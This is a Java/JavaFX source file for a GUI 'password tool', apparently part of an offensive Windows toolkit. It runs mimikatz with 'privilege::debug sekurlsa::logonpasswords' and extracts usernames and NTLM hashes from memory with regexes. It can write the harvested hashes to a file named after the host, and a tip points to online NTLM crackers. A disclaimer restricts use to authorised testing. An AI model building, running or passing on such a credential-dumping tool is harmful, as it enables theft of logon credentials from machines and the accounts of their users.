package fx;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import base.SMaker;
import javafx.animation.AnimationTimer;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import javafx.scene.paint.Color;
import javafx.scene.text.Font;
import javafx.stage.DirectoryChooser;

public class Pw {
	public static Group giant=new Group();
	public static Scene sPw=new Scene(giant,800,600);
	public static VBox root=new VBox();
	// 初始颜色在RGB空间中
    static double r = 1.0, g = 0.0, b = 0.0;
    // 颜色变化方向
    static double dr = -0.005, dg = 0.005, db = 0.0;
    static String mimiDir = "\"C:\\Program Files\\osktools\\mimikatz\\x64\\mimikatz.exe\"";
	static String result="NULL";
    public static void initS() {
		Label title=new Label("密码工具");
		title.setFont(Font.font(48));
		title.setTextFill(Color.web(Config._8));
		
		//Label note=new Label("免责声明：\r\n" + 
		//		"本工具仅限于合法和授权的安全测试与教育用途。未经授权的使用可能导致法律责任。使用者需确保其行为符合相关法律法规，并获得所有必要的授权。使用本工具即表示您同意承担所有相关风险和法律责任。");
        Label note = new Label("免责声明：" + 
        				"本工具仅限于合法和授权的安全测试与教育用途。未经授权的使用可能导致法律责任。使用者需确保其行为符合相关法律法规，并获得所有必要的授权。使用本工具即表示您同意承担所有相关风险和法律责任。");
        note.setStyle("-fx-font-size: 16px; -fx-font-weight: bold;");
        note.setMaxWidth(800);
        note.setWrapText(true);
        

        AnimationTimer timer = new AnimationTimer() {
            private long lastUpdate = 0 ;
            private final long interval = 50; // 50毫秒
            
            @Override
            public void handle(long now) {
                if (now - lastUpdate >= interval) {
                    // 更新颜色值
                    r += dr;
                    g += dg;
                    b += db;

                    // 检查边界并改变方向
                    if (r <= 0.0 || r >= 1.0) {
                        dr = -dr;
                    }
                    if (g <= 0.0 || g >= 1.0) {
                        dg = -dg;
                    }
                    if (b <= 0.0 || b >= 1.0) {
                        db = -db;
                    }

                    // 设置新的颜色
                    try {
                    	note.setTextFill(new Color(r, g, b, 1.0));
                    }catch(IllegalArgumentException e) {
                    }
                    
                    lastUpdate = now;
                }
            }
        };
        timer.start();
        
        TextArea pwV = new TextArea();
        pwV.setText("先读取密码，才能显示结果");
        pwV.setFont(Font.font(18));
        pwV.setEditable(false);
        pwV.setStyle("-fx-background-color: rgba(255, 255, 255, 0.5);");
        
        HBox bar=new HBox();
        Label read=new Label("读取密码   ");
        read.setFont(Font.font(24));
        read.setTextFill(Color.web(Config._8));
        read.setOnMouseEntered((MouseEvent event) -> {
        	read.setTextFill(Color.LIGHTGREY);
        });
        read.setOnMouseExited((MouseEvent event) -> {
        	read.setTextFill(Color.web(Config._6));
        });
        read.setOnMousePressed((MouseEvent event) -> {
        	read();
        	pwV.setText(result);
        });
        Label write=new Label("   写入到文件");
        write.setFont(Font.font(24));
        write.setTextFill(Color.web(Config._8));
        write.setOnMouseEntered((MouseEvent event) -> {
        	write.setTextFill(Color.LIGHTGREY);
        });
        write.setOnMouseExited((MouseEvent event) -> {
        	write.setTextFill(Color.web(Config._6));
        });
        write.setOnMouseClicked(e->{
        	DirectoryChooser directoryChooser = new DirectoryChooser();
            directoryChooser.setTitle("选择保存密码的目录");

            
            File initialDirectory = new File("C:/");
            directoryChooser.setInitialDirectory(initialDirectory);

            File selectedDirectory = directoryChooser.showDialog(Root.stage);

            if (selectedDirectory != null) {
                String path=selectedDirectory.getAbsolutePath();
                
                InetAddress inetAddress = null;
				try {
					inetAddress = InetAddress.getLocalHost();
				} catch (UnknownHostException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				String hostName = "UnkownHost";
				hostName = inetAddress.getHostName();
		        LocalDateTime now = LocalDateTime.now();
		        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyMMddHHmmss");
		        String time = now.format(formatter);
		        String fileName="OSK___"+hostName+"____"+time;
		        String filePath = path+"\\"+fileName+".txt";

		        // 使用 try-with-resources 确保资源被正确关闭
		        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {
		            writer.write(pwV.getText());
		            System.out.println("文件写入成功！");
		        } catch (IOException e52666v3) {
		            e52666v3.printStackTrace();
		            System.out.println("文件写入失败！");
		        }
            } else {
                System.out.println("未选择任何目录");
            }
        });
        bar.getChildren().addAll(read,write);
        
        Label tips=new Label("Tips：可以使用网上的NTLM解密器解密，如hashes.com。");
        tips.setTextFill(Color.web(Config._8));
		root.getChildren().addAll(title,note,bar,pwV,tips);
		giant.getChildren().add(SMaker.maker(root));
        
	}
	
	static void read() {
        String mimiDir = ".\\mimikatz\\x64\\mimikatz.exe";

        try {
            // 使用双引号包裹路径
            String command = "\"" + mimiDir + "\" " + "privilege::debug" + " " + "sekurlsa::logonpasswords" + " " + "exit";
            Process process = Runtime.getRuntime().exec(command);

            // 读取输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder outputBuilder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                outputBuilder.append(line).append("\n");
            }

            String output = outputBuilder.toString();
            System.out.println("Mimikatz Output:\n" + output);

            // 提取用户名和 NTLM 密码
            extractCredentials(output);

            // 等待进程结束
            int exitCode = process.waitFor();
            System.out.println("Exited with code: " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void extractCredentials(String output) {
        // 正则表达式匹配用户名和 NTLM 密码
        // 假设用户名在 "Username" 字段，NTLM 密码在 "NTLM" 字段
        String usernamePattern = "Username *: (.*)";
        String ntlmPattern = "NTLM *: (.*)";
        String out="读取到的密码（包含重复字段）："+"\n";
        
        Pattern userPattern = Pattern.compile(usernamePattern, Pattern.MULTILINE);
        Pattern ntlmPatt = Pattern.compile(ntlmPattern, Pattern.MULTILINE);

        Matcher userMatcher = userPattern.matcher(output);
        Matcher ntlmMatcher = ntlmPatt.matcher(output);

        while (userMatcher.find() && ntlmMatcher.find()) {
            String username = userMatcher.group(1).trim();
            String ntlm = ntlmMatcher.group(1).trim();
            out=out+"Username: " + username + ", NTLM: " + ntlm+"    \n";
        }
        result=out;
    }
}

